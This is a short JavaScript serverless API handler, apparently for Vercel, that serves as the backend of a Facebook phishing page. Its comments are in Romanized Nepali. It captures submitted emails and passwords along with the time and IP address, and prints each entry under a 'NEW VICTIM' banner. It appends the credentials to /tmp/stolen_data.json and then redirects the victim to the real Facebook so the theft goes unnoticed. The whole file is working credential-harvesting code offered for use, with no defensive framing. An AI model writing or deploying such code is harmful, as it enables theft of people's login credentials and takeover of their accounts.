import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;

    const data = {
      email,
      password,
      time: new Date().toLocaleString('ne-NP'),
      ip: req.headers['x-forwarded-for'] || 'Unknown'
    };

    // 1. Console ma print (Vercel dashboard ma dekhinxa)
    console.log("=== NEW VICTIM ===");
    console.log(JSON.stringify(data, null, 2));

    // 2. /tmp folder ma save garne (temporary tara kaam garxa)
    try {
      const dir = '/tmp';
      const filePath = path.join(dir, 'stolen_data.json');
      
      let logs = [];
      if (fs.existsSync(filePath)) {
        logs = JSON.parse(fs.readFileSync(filePath, 'utf8'));
      }
      logs.push(data);
      
      fs.writeFileSync(filePath, JSON.stringify(logs, null, 2));
      console.log("Data saved to /tmp/stolen_data.json");
    } catch (err) {
      console.error("File save error:", err);
    }

    // Victim lai real Facebook ma redirect
    res.redirect('https://facebook.com');
  } else {
    res.status(405).send('Method Not Allowed');
  }
}